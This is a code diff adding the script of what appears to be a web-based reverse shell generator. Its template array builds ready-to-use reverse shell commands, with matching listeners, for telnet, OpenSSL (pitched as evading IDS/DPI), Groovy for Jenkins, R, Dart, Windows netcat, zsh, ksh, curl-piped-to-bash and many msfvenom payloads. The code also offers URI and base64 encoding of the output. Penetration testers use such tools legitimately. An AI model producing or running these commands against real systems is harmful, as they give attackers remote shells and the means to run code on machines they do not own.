+    fn:(ip,port,sh)=>{const p2=parseInt(port)+1;return`telnet ${ip} ${port} | ${sh} | telnet ${ip} ${p2}`;},
+    listener:p=>{const p2=parseInt(p)+1;return`nc -lvnp ${p}  # stdout\nnc -lvnp ${p2} # stderr/stdin`;},
+    info:'Telnet reverse shell using two ports — one for input, one for output.'
+  },
+  // ── OPENSSL ──
+  {id:'openssl',name:'OpenSSL',os:'linux',cat:'OpenSSL',
+    fn:(ip,port,sh)=>`mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${ip}:${port} > /tmp/s; rm /tmp/s`,
+    listener:p=>`openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=revshell" 2>/dev/null\nopenssl s_server -quiet -key key.pem -cert cert.pem -port ${p}`,
+    info:'Encrypted OpenSSL reverse shell. Traffic is TLS encrypted — bypasses plaintext IDS/DPI.'
+  },
+  {id:'openssl-2',name:'OpenSSL v2',os:'linux',cat:'OpenSSL',
+    fn:(ip,port,sh)=>`openssl s_client -quiet -connect ${ip}:${port}|${sh}|openssl s_client -quiet -connect ${ip}:${parseInt(port)+1}`,
+    listener:p=>{const p2=parseInt(p)+1;return`openssl req -x509 -newkey rsa:4096 -keyout k.pem -out c.pem -days 1 -nodes -subj "/CN=r" 2>/dev/null\nopenssl s_server -quiet -key k.pem -cert c.pem -port ${p}    # stdin\nopenssl s_server -quiet -key k.pem -cert c.pem -port ${p2}   # stdout`;},
+    info:'OpenSSL encrypted reverse shell using two ports.'
+  },
+  // ── GROOVY ──
+  {id:'groovy',name:'Groovy',os:'linux',cat:'Groovy',
+    fn:(ip,port,sh)=>`String host="${ip}"; int port=${port}; String cmd="${sh}"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Groovy reverse shell — perfect for Jenkins Script Console exploitation.'
+  },
+  // ── R ──
+  {id:'r-shell',name:'R',os:'linux',cat:'R',
+    fn:(ip,port,sh)=>`r = as.integer(system2("which", "ncat", stdout=TRUE));
+socket <- scan(what="character",n=1)
+system2("/bin/bash", args=c("-i", paste0(">&/dev/tcp/${ip}/${port}"),  "0>&1"))`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'R language reverse shell. Useful when R is installed on data science/ML servers.'
+  },
+  // ── DART ──
+  {id:'dart',name:'Dart',os:'linux',cat:'Dart',
+    fn:(ip,port,sh)=>`import 'dart:io';
+import 'dart:convert';
+main(){Socket.connect("${ip}",${port}).then((socket){socket.listen((data){Process.start('${sh}',[]).then((process){socket.pipe(process.stdin);process.stdout.pipe(socket);process.stderr.pipe(socket);});},onDone:(){socket.destroy();});});}`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Dart reverse shell. Useful on Flutter/Dart development servers.'
+  },
+  // ── WINDOWS-SPECIFIC ──
+  {id:'cmd-mkfifo',name:'Windows CMD',os:'windows',cat:'Windows',
+    fn:(ip,port,sh)=>`cmd /c "start /min cmd /c "nc.exe ${ip} ${port} -e cmd.exe""`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Windows CMD reverse shell using netcat.exe on target.'
+  },
+  {id:'msfvenom-exe',name:'MSFVenom EXE',os:'windows',cat:'MSFVenom',
+    fn:(ip,port,sh)=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o reverse.exe`,
+    listener:p=>`# Start Metasploit listener:\nmsfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${p}; run"`,
+    info:'Generate a Windows x64 reverse shell EXE using msfvenom.'
+  },
+  {id:'msfvenom-asp',name:'MSFVenom ASP',os:'windows',cat:'MSFVenom',
+    fn:(ip,port,sh)=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f asp -o shell.asp`,
+    listener:p=>`msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${p}; run"`,
+    info:'ASP reverse shell payload for IIS web servers.'
+  },
+  {id:'msfvenom-aspx',name:'MSFVenom ASPX',os:'windows',cat:'MSFVenom',
+    fn:(ip,port,sh)=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f aspx -o shell.aspx`,
+    listener:p=>`msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${p}; run"`,
+    info:'ASPX reverse shell payload for ASP.NET web applications.'
+  },
+  {id:'msfvenom-jsp',name:'MSFVenom JSP',os:'linux',cat:'MSFVenom',
+    fn:(ip,port,sh)=>`msfvenom -p java/jsp_shell_reverse_tcp LHOST=${ip} LPORT=${port} -f raw -o shell.jsp`,
+    listener:p=>`msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${p}; run"`,
+    info:'JSP reverse shell payload for Tomcat/Java web applications.'
+  },
+  {id:'msfvenom-war',name:'MSFVenom WAR',os:'linux',cat:'MSFVenom',
+    fn:(ip,port,sh)=>`msfvenom -p java/jsp_shell_reverse_tcp LHOST=${ip} LPORT=${port} -f war -o shell.war`,
+    listener:p=>`msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT ${p}; run"`,
+    info:'WAR archive reverse shell for Apache Tomcat manager upload.'
+  },
+  {id:'msfvenom-php',name:'MSFVenom PHP',os:'linux',cat:'MSFVenom',
+    fn:(ip,port,sh)=>`msfvenom -p php/reverse_php LHOST=${ip} LPORT=${port} -f raw -o shell.php`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'PHP reverse shell payload generated by msfvenom.'
+  },
+  {id:'msfvenom-elf',name:'MSFVenom ELF',os:'linux',cat:'MSFVenom',
+    fn:(ip,port,sh)=>`msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o reverse`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Linux x64 ELF reverse shell binary. chmod +x and execute on target.'
+  },
+  // ── ZSH ──
+  {id:'zsh',name:'Zsh',os:'linux',cat:'Zsh',
+    fn:(ip,port,sh)=>`zsh -c 'zmodload zsh/net/tcp && ztcp ${ip} ${port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Zsh reverse shell using its built-in TCP module. Found on macOS and many Linux systems.'
+  },
+  // ── KSH ──
+  {id:'ksh',name:'Ksh',os:'linux',cat:'Ksh',
+    fn:(ip,port,sh)=>`ksh -c 'ksh -i >& /dev/tcp/${ip}/${port} 0>&1'`,
+    listener:p=>`nc -lvnp ${p}`,
+    info:'Ksh (Korn Shell) reverse shell. Found on older Unix/AIX systems.'
+  },
+  // ── CURL ──
+  {id:'curl-revshell',name:'Curl (raw)',os:'linux',cat:'Curl',
+    fn:(ip,port,sh)=>`# Host your shell at http://${ip}/rev.sh then:\ncurl http://${ip}/rev.sh | bash`,
+    listener:p=>`# Serve rev.sh:\necho 'bash -i >& /dev/tcp/${ip}/${p} 0>&1' > rev.sh\npython3 -m http.server 80\n# Then catch shell:\nnc -lvnp ${p}`,
+    info:'Curl and execute a remote shell script. Useful when curl is available but execution is limited.'
+  },
+  // ── XTERM ──
+  {id:'xterm',name:'Xterm',os:'linux',cat:'X11',
+    fn:(ip,port,sh)=>`xterm -display ${ip}:1`,
+    listener:p=>`Xnest :1\nxhost +${ip}\n# The xterm will connect back to your display`,
+    info:'Xterm reverse connection. Requires X11 forwarding and Xnest/Xephyr on attacker.'
+  },
+];
+
+// ─── STATE ───────────────────────────────────────────────────────────────────
+let currentShell = null;
+let currentOS = 'all';
+let searchQ = '';
+let encoding = 'none';
+
+// ─── INIT ────────────────────────────────────────────────────────────────────
+function init() {
+  setEnc('none');
+  renderList();
+  // Select first shell
+  const first = SHELLS.find(s=>s.os==='linux')||SHELLS[0];
+  selectShell(first.id);
+}
+
+function setOS(os, el) {
+  currentOS = os;
+  document.querySelectorAll('.os-tab').forEach(t=>t.classList.remove('active'));
+  el.classList.add('active');
+  renderList();
+}
+
+function filterShells() {
+  searchQ = document.getElementById('shell-search').value.toLowerCase();
+  renderList();
+}
+
+function renderList() {
+  const list = document.getElementById('shell-list');
+  const filtered = SHELLS.filter(s => {
+    const osMatch = currentOS === 'all' || s.os === currentOS;
+    const qMatch = !searchQ || s.name.toLowerCase().includes(searchQ) || s.cat.toLowerCase().includes(searchQ);
+    return osMatch && qMatch;
+  });
+
+  // Group by category
+  const groups = {};
+  filtered.forEach(s => {
+    if (!groups[s.cat]) groups[s.cat] = [];
+    groups[s.cat].push(s);
+  });
+
+  let html = '';
+  for (const [cat, shells] of Object.entries(groups)) {
+    html += `<div style="font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--text3);padding:.5rem .7rem .2rem;margin-top:.3rem">${cat}</div>`;
+    shells.forEach(s => {
+      const active = currentShell && currentShell.id === s.id ? ' active' : '';
+      const osBadge = s.os === 'windows' ? '🪟' : s.os === 'mac' ? '🍎' : '🐧';
+      html += `<div class="shell-item${active}" onclick="selectShell('${s.id}')">
+        <span class="name">${s.name}</span>
+        <span class="badge">${osBadge}</span>
+      </div>`;
+    });
+  }
+
+  if (!html) html = '<div style="color:var(--text3);font-size:.82rem;padding:1rem;text-align:center">No shells found</div>';
+  list.innerHTML = html;
+}
+
+function selectShell(id) {
+  currentShell = SHELLS.find(s=>s.id===id);
+  if (!currentShell) return;
+  renderList();
+  regenerate();
+  document.getElementById('empty-state').style.display = 'none';
+  document.getElementById('shell-output').style.display = 'block';
+}
+
+function regenerate() {
+  if (!currentShell) return;
+  const ip = document.getElementById('ip').value || '10.10.10.10';
+  const port = document.getElementById('port').value || '4444';
+  const sh = document.getElementById('shell-type').value;
+
+  let cmd = currentShell.fn(ip, port, sh);
+  let listener = currentShell.listener(port);
+
+  // Apply encoding
+  if (encoding === 'uri') {
+    cmd = encodeURIComponent(cmd);
+  } else if (encoding === 'b64') {
+    try { cmd = btoa(unescape(encodeURIComponent(cmd))); } catch(e){}
+  }
+
+  document.getElementById('out-title').textContent = currentShell.name;
+  const osBadge = currentShell.os === 'windows' ? '🪟 Windows' : currentShell.os === 'mac' ? '🍎 macOS' : '🐧 Linux';
+  document.getElementById('out-badge').textContent = `${osBadge} · ${currentShell.cat}`;
+  document.getElementById('out-code').textContent = cmd;
+  document.getElementById('out-listener').textContent = listener;
+  document.getElementById('out-info').innerHTML = `ℹ️ <strong>Note:</strong> ${currentShell.info}`;
+
+  // Hide TTY steps for Windows/msfvenom/powershell
+  const showTTY = currentShell.os === 'linux' && !currentShell.cat.includes('MSFVenom');
+  document.getElementById('tty-section').style.display = showTTY ? 'block' : 'none';
+}
+
+function incPort() {
+  const el = document.getElementById('port');
+  el.value = parseInt(el.value||4444) + 1;
+  regenerate();
+}
+
+function setEnc(mode) {
+  encoding = mode;
+  document.querySelectorAll('.enc-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('enc-'+mode).classList.add('active');
+  regenerate();
+}
+
+function copyShell() {
+  const txt = document.getElementById('out-code').textContent;
+  navigator.clipboard.writeText(txt).then(() => {
+    const btn = document.getElementById('copy-btn');
+    btn.textContent = '✅ Copied!';
+    btn.classList.add('success');
+    setTimeout(()=>{ btn.textContent='📋 Copy'; btn.classList.remove('success'); }, 1500);
+  });
+}
+
+function downloadShell() {
+  const txt = document.getElementById('out-code').textContent;
+  const name = (currentShell?.name||'shell').replace(/\s+/g,'_').toLowerCase();
+  const ext = currentShell?.os==='windows' ? (currentShell.cat==='PowerShell'?'.ps1':'.bat') : '.sh';
+  const blob = new Blob([txt], {type:'text/plain'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = name + ext;
+  a.click();
+  URL.revokeObjectURL(a.href);
+}
+
+function copyStep(btn) {
+  const text = btn.parentElement.textContent.replace(btn.textContent,'').trim();
+  navigator.clipboard.writeText(text).then(()=>{
+    btn.textContent='✓';
+    setTimeout(()=>btn.textContent='copy',1200);
+  });
+}
+
+function toggleTTY() {
+  const steps = document.getElementById('tty-steps');
+  steps.style.display = steps.style.display === 'none' ? 'flex' : 'none';
+}
+
+function setTheme(t) {
+  document.querySelectorAll('.hdr-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('btn-'+t).classList.add('active');
+  if (t === 'light') {
+    document.documentElement.style.setProperty('--bg','#f6f8fa');
+    document.documentElement.style.setProperty('--bg2','#ffffff');
+    document.documentElement.style.setProperty('--bg3','#f0f2f5');
+    document.documentElement.style.setProperty('--bg4','#e0e4e8');
+    document.documentElement.style.setProperty('--text','#1a1a2e');
+    document.documentElement.style.setProperty('--text2','#555577');
+    document.documentElement.style.setProperty('--text3','#8888aa');
+    document.documentElement.style.setProperty('--border','#d0d7de');
+    document.documentElement.style.setProperty('--border2','#c8ccd0');
+  } else {
+    document.documentElement.style.setProperty('--bg','#0d1117');
+    document.documentElement.style.setProperty('--bg2','#161b22');
+    document.documentElement.style.setProperty('--bg3','#21262d');
+    document.documentElement.style.setProperty('--bg4','#30363d');
+    document.documentElement.style.setProperty('--text','#e6edf3');
+    document.documentElement.style.setProperty('--text2','#8b949e');
+    document.documentElement.style.setProperty('--text3','#484f58');
+    document.documentElement.style.setProperty('--border','#30363d');
+    document.documentElement.style.setProperty('--border2','#21262d');
+  }
+}
+
+init();
+</script>
+</body>
+</html>
